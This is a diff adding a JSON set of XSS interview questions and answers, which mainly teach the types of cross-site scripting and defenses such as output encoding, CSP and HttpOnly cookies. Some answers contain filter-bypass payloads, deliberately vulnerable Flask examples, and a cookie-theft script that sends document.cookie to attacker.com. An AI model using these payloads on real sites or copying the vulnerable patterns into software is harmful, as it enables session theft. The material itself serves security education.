@@ -1,0 +1,119 @@
+{
+  "topicId": "xss",
+  "name": "XSS",
+  "source": "XSS/XSS - Interview Questions & Answers.md",
+  "prompts": [
+    {
+      "id": "p351a67ea769bb6",
+      "cluster": "Fundamental Questions",
+      "title": "What is XSS and how does it work?",
+      "seconds": 120,
+      "answerMarkdown": "XSS (Cross-Site Scripting) is a vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users.\n\n**How it works:**\n\n1. **Attacker submits malicious script**\u00a0to application (via forms, URLs, etc.)\n2. **Application fails to encode**\u00a0user input before outputting it\n3. **Malicious script included**\u00a0in HTML response\n4. **Victim's browser receives**\u00a0HTML with malicious script\n5. **Browser executes script**\u00a0in context of vulnerable application\n6. **Script runs with application's privileges**\u00a0(can access cookies, DOM, etc.)\n\n**Example:**\n\n```python\n\n# Vulnerable code\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    return f\"<h1>Results for: {query}</h1>\"  # XSS!\n\n# Attack\n\n# URL: /search?q=<script>alert('XSS')</script>\n\n```\n\n**Key Point:**\u00a0XSS occurs when user input is not properly encoded before being included in HTML output, allowing attackers to inject and execute malicious scripts.\n\n---"
+    },
+    {
+      "id": "p7f52c7f864a0d3",
+      "cluster": "Fundamental Questions",
+      "title": "What are the three main types of XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Reflected XSS (Non-Persistent):**\n\n- Payload reflected immediately in response\n- Not stored on server\n- Requires user interaction (clicking link)\n- Example: URL parameter reflection\n\n**2. Stored XSS (Persistent):**\n\n- Payload stored on server (database, file, etc.)\n- Executed when victim views affected page\n- No user interaction needed\n- More dangerous than reflected XSS\n- Example: Malicious comment stored in database\n\n**3. DOM-Based XSS:**\n\n- Vulnerability in client-side JavaScript\n- No server-side reflection needed\n- Payload in URL fragment (#) or parameters\n- Example: JavaScript uses\u00a0`location.hash`\u00a0unsafely\n\n---"
+    },
+    {
+      "id": "pe858b4f33240f7",
+      "cluster": "Fundamental Questions",
+      "title": "Why is output encoding more important than input validation for preventing XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**Output encoding prevents XSS because:**\n\n- Encodes data based on\u00a0**context**\u00a0(HTML, JavaScript, URL, CSS)\n- Prevents browser from interpreting input as code\n- Applied immediately before rendering\n- Works regardless of input source\n\n**Input validation alone doesn't prevent XSS because:**\n\n- Validation may be bypassed\n- Input might be used in different contexts\n- Validated input can still contain XSS in wrong context\n- Input validation doesn't encode output\n\n**Example:**\n\n```python\n\n# \u274c Input validation alone\n\ndef validate_input(input_value):\n    if '<script>' in input_value:\n        return input_value.replace('<script>', '')\n    return input_value\n\ncleaned = validate_input('<script>alert(1)</script>')\n\n# Result: alert(1)  (still dangerous!)\n\n# Output to HTML\n\ndocument.innerHTML = cleaned;  # Still executes!\n\n# \u2705 Output encoding\n\nfrom html import escape\nuser_input = '<script>alert(1)</script>'\nsafe_output = escape(user_input)\n\n# Result: &lt;script&gt;alert(1)&lt;/script&gt;\n\n# Safe: Browser treats as text, not code\n\n```\n\n**Key Point:**\u00a0Encode output based on context, not just validate input. Output encoding is the primary defense against XSS.\n\n---"
+    },
+    {
+      "id": "pba3a265b78b58e",
+      "cluster": "Types and Mechanisms",
+      "title": "Explain the difference between Reflected and Stored XSS with examples.",
+      "seconds": 120,
+      "answerMarkdown": "**Reflected XSS:**\n\n**Example:**\n\n```python\n\n# Vulnerable code\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    return f\"<h1>Results for: {query}</h1>\"\n\n# Attack: User visits malicious URL\n\n# /search?q=<script>alert('XSS')</script>\n\n```\n\n**Characteristics:**\n\n- Payload in URL/request\n- Not stored on server\n- Requires user to click link\n- Appears to come from legitimate domain\n\n**Stored XSS:**\n\n**Example:**\n\n```python\n\n# Vulnerable code\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment = request.form['comment']\n    db.comments.insert({'comment': comment})  # Stored!\n    return \"Comment added\"\n\n@app.route('/post/<id>')\ndef show_post(id):\n    comments = db.comments.find({'post_id': id})\n    return render_template('post.html', comments=comments)  # Displayed!\n\n# Attack: Attacker submits malicious comment\n\n# Comment: <script>alert('XSS')</script>\n\n# Stored in database, executed for all users viewing post\n\n```\n\n**Characteristics:**\n\n- Payload stored on server\n- Affects all users viewing content\n- No user interaction needed\n- More dangerous and persistent\n\n---"
+    },
+    {
+      "id": "p659cb4d630b956",
+      "cluster": "Types and Mechanisms",
+      "title": "What is DOM-Based XSS and how is it different?",
+      "seconds": 120,
+      "answerMarkdown": "DOM-Based XSS occurs when client-side JavaScript unsafely manipulates the DOM based on user input.\n\n**Example:**\n\n```jsx\n// Vulnerable client-side code\nconst urlParams = new URLSearchParams(window.location.search);\nconst name = urlParams.get('name');\ndocument.getElementById('greeting').innerHTML = 'Hello ' + name;\n\n// Attack\n// URL: /page?name=<script>alert('XSS')</script>\n// innerHTML executes script\n\n```\n\n**Differences from Reflected/Stored XSS:**\n\n1. **Vulnerability Location:**\n    - DOM-Based: Client-side JavaScript\n    - Reflected/Stored: Server-side code\n2. **Payload Source:**\n    - DOM-Based: URL fragment (#), parameters, localStorage, etc.\n    - Reflected: Request parameters\n    - Stored: Database/file storage\n3. **Detection:**\n    - DOM-Based: Requires client-side testing\n    - Reflected/Stored: Can be detected server-side\n4. **Mitigation:**\n    - DOM-Based: Use safe DOM APIs (textContent, not innerHTML)\n    - Reflected/Stored: Server-side output encoding\n\n---"
+    },
+    {
+      "id": "p973c0b159cf3ff",
+      "cluster": "Mitigation Questions",
+      "title": "How does output encoding prevent XSS?",
+      "seconds": 120,
+      "answerMarkdown": "Output encoding converts special characters to their HTML entities or encoded representations, preventing the browser from interpreting them as code.\n\n**HTML Context Encoding:**\n\n```python\nfrom html import escape\n\nuser_input = \"<script>alert('XSS')</script>\"\nsafe_output = escape(user_input)\n\n# Result: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;\n\n# Browser treats as text, not executable code\n\n<h1>{safe_output}</h1>\n\n```\n\n**Why It Works:**\n\n- Special characters (`<`,\u00a0`>`,\u00a0`&`,\u00a0`\"`,\u00a0`'`) converted to entities\n- Browser treats entities as text, not HTML/JavaScript\n- Scripts cannot execute because they're encoded\n\n**Context-Specific Encoding:**\n\n**HTML Body:**\n\n```python\nfrom html import escape\nsafe_output = escape(user_input)\n\n```\n\n**HTML Attribute:**\n\n```python\nfrom html import escape\nsafe_output = escape(user_input, quote=True)\n\n```\n\n**JavaScript:**\n\n```python\nimport json\nsafe_output = json.dumps(user_input)\n\n```\n\n**URL:**\n\n```python\nfrom urllib.parse import quote\nsafe_output = quote(user_input)\n\n```\n\n**Key Point:**\u00a0Encode output based on the context where it's used. Different contexts require different encoding methods.\n\n---"
+    },
+    {
+      "id": "pd4b69134e34e4f",
+      "cluster": "Mitigation Questions",
+      "title": "What is Content Security Policy (CSP) and how does it help prevent XSS?",
+      "seconds": 120,
+      "answerMarkdown": "CSP (Content Security Policy) is an HTTP header that restricts which sources can load content (scripts, styles, images, etc.), reducing the impact of XSS attacks.\n\n**How CSP Works:**\n\n```python\nresponse.headers['Content-Security-Policy'] = (\n    \"default-src 'self'; \"           # Only same-origin by default\n    \"script-src 'self'; \"            # Only same-origin scripts\n    \"style-src 'self' 'unsafe-inline'; \"  # Same-origin + inline styles\n    \"img-src 'self' https:; \"        # Same-origin + HTTPS images\n    \"connect-src 'self'; \"           # Same-origin fetch/XHR\n    \"object-src 'none'; \"            # No object/embed/applet\n    \"base-uri 'self'; \"              # Only same-origin base URIs\n    \"form-action 'self'; \"           # Only same-origin form submissions\n    \"frame-ancestors 'none'\"         # Cannot be embedded\n)\n\n```\n\n**Benefits:**\n\n- Prevents inline scripts from executing (if\u00a0`'unsafe-inline'`\u00a0not allowed)\n- Restricts script sources to whitelisted domains\n- Prevents data URI scripts\n- Reduces XSS impact even if encoding fails\n\n**Limitations:**\n\n- Doesn't prevent XSS itself, only reduces impact\n- Can be bypassed if misconfigured\n- Not a substitute for output encoding\n- Requires careful configuration\n\n**Key Point:**\u00a0CSP is a defense-in-depth measure that reduces XSS impact but doesn't replace output encoding.\n\n---"
+    },
+    {
+      "id": "pcec255c74d6f2c",
+      "cluster": "Mitigation Questions",
+      "title": "Why are HttpOnly cookies important for XSS protection?",
+      "seconds": 120,
+      "answerMarkdown": "HttpOnly cookies prevent JavaScript from accessing cookies via\u00a0`document.cookie`, protecting session cookies from XSS attacks.\n\n**How It Works:**\n\n```python\n\n# Set HttpOnly cookie\n\nresponse.set_cookie(\n    'sessionId',\n    value=session_id,\n    httponly=True,  # JavaScript cannot access\n    secure=True,    # HTTPS only\n    samesite='Strict'\n)\n\n```\n\n**Protection:**\n\n```jsx\n// XSS payload\n<script>\n  fetch('http://attacker.com/steal?cookie=' + document.cookie);\n</script>\n\n// With HttpOnly: document.cookie doesn't include sessionId\n// Attack fails: session cookie not accessible to JavaScript\n\n```\n\n**Benefits:**\n\n- Prevents cookie theft via XSS\n- Reduces impact of XSS attacks\n- Easy to implement\n\n**Limitations:**\n\n- Only protects cookies, not XSS itself\n- Doesn't prevent other XSS impacts (keylogging, defacement, etc.)\n- Use with output encoding and CSP\n\n**Key Point:**\u00a0HttpOnly cookies prevent cookie theft but don't prevent XSS. Use with output encoding and CSP for complete protection.\n\n---"
+    },
+    {
+      "id": "pb78009568bba04",
+      "cluster": "Security Questions",
+      "title": "What is the impact of XSS vulnerabilities?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Session Hijacking:**\n\n- Steal session cookies\n- Impersonate users\n- Gain unauthorized access to accounts\n\n**2. Data Theft:**\n\n- Extract sensitive information\n- Steal credentials\n- Access personal data\n\n**3. Defacement:**\n\n- Modify page content\n- Display malicious content\n- Damage reputation\n\n**4. Keylogging:**\n\n- Capture user keystrokes\n- Steal passwords\n- Monitor user activity\n\n**5. Phishing:**\n\n- Display fake login forms\n- Trick users into providing credentials\n- Steal sensitive information\n\n**6. Malware Delivery:**\n\n- Redirect to malicious sites\n- Download malware\n- Compromise user systems\n\n**Business Impact:**\n\n- Account compromise\n- Financial fraud\n- Data breach\n- Reputation damage\n- Legal liability\n- Regulatory violations\n\n---"
+    },
+    {
+      "id": "p153b2218f53034",
+      "cluster": "Security Questions",
+      "title": "Why doesn't input validation alone prevent XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**Input validation limitations:**\n\n1. **Context Mismatch:**\n    - Input might be valid but dangerous in HTML context\n    - Validation doesn't know where input will be used\n2. **Bypass Techniques:**\n    - Encoding can bypass validation\n    - Multiple encoding layers\n    - Alternative payload formats\n3. **No Output Encoding:**\n    - Validation happens at input time\n    - Output encoding happens at output time\n    - Validation doesn't encode output\n\n**Example:**\n\n```python\n\n# \u274c Input validation alone\n\ndef validate_input(input_value):\n\n# Remove <script> tags\n\n    return input_value.replace('<script>', '').replace('</script>', '')\n\ncleaned = validate_input('<script>alert(1)</script>')\n\n# Result: alert(1)  (still dangerous!)\n\n# Output to HTML\n\ndocument.innerHTML = cleaned;  # Still executes!\n\n# \u2705 Output encoding\n\nfrom html import escape\nuser_input = '<script>alert(1)</script>'\nsafe_output = escape(user_input)\n\n# Result: &lt;script&gt;alert(1)&lt;/script&gt;\n\n# Safe: Browser treats as text\n\n```\n\n**Best Practice:**\n\n- Use input validation for data integrity\n- Use output encoding for XSS prevention\n- Both work together but serve different purposes\n\n---"
+    },
+    {
+      "id": "p8b02276923a9db",
+      "cluster": "Scenario-Based Questions",
+      "title": "You discover a search feature that reflects user input. How would you test for XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**Step 1: Identify Input Point**\n\n```python\n\n# Vulnerable code\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    return f\"<h1>Results for: {query}</h1>\"\n\n```\n\n**Step 2: Test Basic Payload**\n\n```\nURL: /search?q=<script>alert('XSS')</script>\n\n```\n\n**Step 3: Determine Context**\n\n- Check where input is reflected\n- Identify encoding/filtering\n- Determine injection context (HTML, JavaScript, attribute)\n\n**Step 4: Test Context-Specific Payloads**\n\n**HTML Context:**\n\n```\n<script>alert('XSS')</script>\n<img src=x onerror=\"alert('XSS')\">\n<svg onload=\"alert('XSS')\">\n\n```\n\n**JavaScript Context:**\n\n```\n'; alert('XSS'); //\n\n```\n\n**Attribute Context:**\n\n```\n\" onmouseover=\"alert('XSS')\n\n```\n\n**Step 5: Test Encoding Bypasses**\n\n- HTML entities\n- Unicode encoding\n- URL encoding\n- Case variation\n\n**Step 6: Verify Exploitation**\n\n- Check if script executes\n- Test in different browsers\n- Validate impact\n\n---"
+    },
+    {
+      "id": "p945e11c60f32b8",
+      "cluster": "Scenario-Based Questions",
+      "title": "How would you fix a stored XSS vulnerability in a comment system?",
+      "seconds": 120,
+      "answerMarkdown": "**Vulnerable Code:**\n\n```python\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment = request.form['comment']\n    db.comments.insert({'comment': comment})  # Stored without encoding!\n    return \"Comment added\"\n\n@app.route('/post/<id>')\ndef show_post(id):\n    comments = db.comments.find({'post_id': id})\n    return render_template('post.html', comments=comments)  # Displayed!\n\n```\n\n**Fix: Output Encoding**\n\n```python\nfrom html import escape\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment = request.form['comment']\n\n# Optionally validate input\n\n    if len(comment) > 1000:\n        return \"Comment too long\", 400\n    db.comments.insert({'comment': comment})\n    return \"Comment added\"\n\n@app.route('/post/<id>')\ndef show_post(id):\n    comments = db.comments.find({'post_id': id})\n\n# Encode on output\n\n    safe_comments = [{'comment': escape(c['comment'])} for c in comments]\n    return render_template('post.html', comments=safe_comments)\n\n```\n\n**Template (Jinja2 auto-escaping):**\n\n{% raw %}\n```html\n<!-- post.html -->\n{% for comment in comments %}\n  <div class=\"comment\">&#123;&#123; comment.comment &#125;&#125;</div>  <!-- Auto-escaped! -->\n{% endfor %}\n\n```\n{% endraw %}\n\n**Additional Defenses:**\n\n- Implement CSP\n- Use HttpOnly cookies\n- Input validation (length, content type)\n- Rate limiting\n\n---"
+    },
+    {
+      "id": "p4559380045657f",
+      "cluster": "Advanced Questions",
+      "title": "How can you bypass XSS filters?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Case Variation:**\n\n```html\n<ScRiPt>alert('XSS')</ScRiPt>\n<sCrIpT>alert('XSS')</sCrIpT>\n\n```\n\n**2. Encoding:**\n\n```html\n<!-- HTML entities -->\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n<!-- Unicode -->\n<script>\\u0061lert('XSS')</script>\n\n```\n\n**3. Event Handlers:**\n\n```html\n<img src=x onerror=\"alert('XSS')\">\n<div onclick=\"alert('XSS')\">Click</div>\n<svg onload=\"alert('XSS')\"></svg>\n\n```\n\n**4. Alternative Tags:**\n\n```html\n<iframe src=\"javascript:alert('XSS')\"></iframe>\n<body onload=\"alert('XSS')\">\n<details open ontoggle=\"alert('XSS')\">\n\n```\n\n**5. Filter Evasion:**\n\n```html\n<!-- If <script> is filtered -->\n<script>alert('XSS')</script>\n\n<!-- Try alternatives -->\n<img src=x onerror=\"alert('XSS')\">\n<svg onload=\"alert('XSS')\">\n\n```\n\n**6. Context-Specific:**\n\n```jsx\n// If HTML encoding exists, try JavaScript context\n'; alert('XSS'); //\n\n```\n\n**Key Point:**\u00a0Most bypasses work because filters are incomplete. Use output encoding based on context, not blacklist filtering.\n\n---"
+    },
+    {
+      "id": "pfef59331e9424c",
+      "cluster": "Advanced Questions",
+      "title": "What is the difference between innerHTML and textContent in terms of XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**innerHTML:**\n\n- Sets/gets HTML content\n- Parses HTML tags\n- **Vulnerable to XSS**\u00a0- Executes scripts\n\n**textContent:**\n\n- Sets/gets text content only\n- Treats input as plain text\n- **Safe from XSS**\u00a0- No HTML parsing\n\n**Example:**\n\n```jsx\nconst userInput = \"<script>alert('XSS')</script>\";\n\n// \u274c VULNERABLE: innerHTML\nelement.innerHTML = userInput;\n// Result: Script executes!\n\n// \u2705 SECURE: textContent\nelement.textContent = userInput;\n// Result: Text displayed as-is, no execution\n\n// Output:\n// innerHTML: (script executes)\n// textContent: <script>alert('XSS')</script> (displayed as text)\n\n```\n\n**Best Practice:**\n\n- Use\u00a0`textContent`\u00a0for user input\n- Only use\u00a0`innerHTML`\u00a0for trusted content\n- Always encode if using\u00a0`innerHTML`\u00a0with untrusted data\n\n---"
+    },
+    {
+      "id": "p2a46271c892aff",
+      "cluster": "Penetration Testing Questions",
+      "title": "What tools would you use to test for XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Burp Suite:**\n\n- Manual testing and payload crafting\n- Intruder for automated payload testing\n- XSS Validator extension\n- Proxy for request manipulation\n\n**2. OWASP ZAP:**\n\n- Automated XSS scanning\n- Manual testing tools\n- Reporting capabilities\n- Active and passive scanning\n\n**3. Browser Developer Tools:**\n\n- Console for testing JavaScript\n- Network tab for payload analysis\n- Sources for debugging\n- Elements for DOM inspection\n\n**4. Custom Scripts:**\n\n```python\nimport requests\n\ndef test_xss(target_url, payload):\n    params = {'q': payload}\n    response = requests.get(target_url, params=params)\n    if payload in response.text and '<script>' in payload:\n        return \"Potential XSS\"\n    return \"No XSS detected\"\n\n```\n\n---"
+    },
+    {
+      "id": "p00a0a78dfaaca4",
+      "cluster": "Penetration Testing Questions",
+      "title": "How would you report an XSS vulnerability?",
+      "seconds": 120,
+      "answerMarkdown": "**Report Structure:**\n\n**1. Executive Summary:**\n\n- Vulnerability type (XSS)\n- Severity (Critical/High/Medium)\n- Affected component\n- Business impact\n\n**2. Technical Details:**\n\n- Vulnerable endpoint/function\n- Injection point\n- Attack vector\n- Proof of concept\n\n**3. Impact Assessment:**\n\n- Potential actions attacker can perform\n- Confidentiality impact (cookie theft, data access)\n- Integrity impact (content modification)\n- Availability impact (DoS potential)\n- Business impact\n\n**4. Steps to Reproduce:**\n\n```\n1. Navigate to vulnerable page\n2. Submit XSS payload\n3. Observe script execution\n4. Verify impact\n\n```\n\n**5. Remediation:**\n\n- Implement output encoding\n- Use CSP headers\n- Set HttpOnly cookies\n- Validate input\n\n**6. Evidence:**\n\n- Screenshots\n- Request/response logs\n- Payload examples\n- Video demonstration\n\n---"
+    }
+  ]
+}
